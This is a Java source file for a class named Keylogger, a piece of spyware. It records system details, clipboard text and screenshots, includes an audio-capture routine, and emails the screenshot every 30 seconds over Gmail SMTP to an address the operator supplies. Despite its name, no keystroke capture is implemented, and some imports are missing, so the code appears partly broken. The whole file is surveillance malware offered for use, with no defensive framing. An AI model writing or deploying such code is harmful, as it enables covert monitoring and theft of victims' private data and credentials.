import java.awt.*;
import java.awt.datatransfer.*;
import java.awt.event.KeyEvent;
import java.awt.event.KeyListener;
import java.io.*;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Properties;
import javax.imageio.ImageIO;
import javax.mail.*;
import javax.mail.internet.*;
import javax.sound.sampled.*;
import javax.swing.*;
import java.util.Timer;
import java.util.TimerTask;

public class Keylogger {
    private static final String FILE_PATH = "//Enter File Path";
    private static final String EMAIL_ADDRESS = "//Enter from addr";
    private static final String PASSWORD = "//Enter Password";
    private static final String TO_ADDRESS = "//Enter to Address here";

    public static void sendEmail(String filename, String filepath) {
        Properties props = new Properties();
        props.put("mail.smtp.host", "smtp.gmail.com");
        props.put("mail.smtp.port", "587");
        props.put("mail.smtp.auth", "true");
        props.put("mail.smtp.starttls.enable", "true");

        Session session = Session.getInstance(props, new Authenticator() {
            protected PasswordAuthentication getPasswordAuthentication() {
                return new PasswordAuthentication(EMAIL_ADDRESS, PASSWORD);
            }
        });

        try {
            Message message = new MimeMessage(session);
            message.setFrom(new InternetAddress(EMAIL_ADDRESS));
            message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(TO_ADDRESS));
            message.setSubject("Log File");
            message.setText("Keylogger data");

            MimeBodyPart messageBodyPart = new MimeBodyPart();
            Multipart multipart = new MimeMultipart();
            
            DataSource source = new javax.activation.FileDataSource(filepath);
            messageBodyPart.setDataHandler(new DataHandler(source));
            messageBodyPart.setFileName(filename);
            multipart.addBodyPart(messageBodyPart);

            message.setContent(multipart);

            Transport.send(message);
        } catch (MessagingException e) {
            e.printStackTrace();
        }
    }

    public static void captureSystemInfo() {
        try (BufferedWriter writer = new BufferedWriter(new FileWriter(FILE_PATH + "systeminfo.txt"))) {
            String hostname = InetAddress.getLocalHost().getHostName();
            String ip = InetAddress.getLocalHost().getHostAddress();
            writer.write("Hostname: " + hostname + "\n");
            writer.write("IP Address: " + ip + "\n");
            writer.write("OS: " + System.getProperty("os.name") + "\n");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static void captureClipboard() {
        try {
            Clipboard clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();
            Transferable contents = clipboard.getContents(null);
            if (contents != null && contents.isDataFlavorSupported(DataFlavor.stringFlavor)) {
                String clipboardData = (String) contents.getTransferData(DataFlavor.stringFlavor);
                Files.write(Paths.get(FILE_PATH + "clipboard.txt"), clipboardData.getBytes());
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void captureScreenshot() {
        try {
            Robot robot = new Robot();
            Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
            BufferedImage image = robot.createScreenCapture(screenRect);
            ImageIO.write(image, "png", new File(FILE_PATH + "screenshot.png"));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void captureAudio(int duration) {
        File audioFile = new File(FILE_PATH + "audio.wav");
        AudioFormat format = new AudioFormat(44100, 16, 2, true, true);
        DataLine.Info info = new DataLine.Info(TargetDataLine.class, format);
        
        try (TargetDataLine line = (TargetDataLine) AudioSystem.getLine(info)) {
            line.open(format);
            line.start();
            AudioInputStream ais = new AudioInputStream(line);
            AudioSystem.write(ais, AudioFileFormat.Type.WAVE, audioFile);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        captureSystemInfo();
        captureClipboard();
        captureScreenshot();

        Timer timer = new Timer();
        timer.schedule(new TimerTask() {
            @Override
            public void run() {
                sendEmail("screenshot.png", FILE_PATH + "screenshot.png");
            }
        }, 30000, 30000);
    }
}

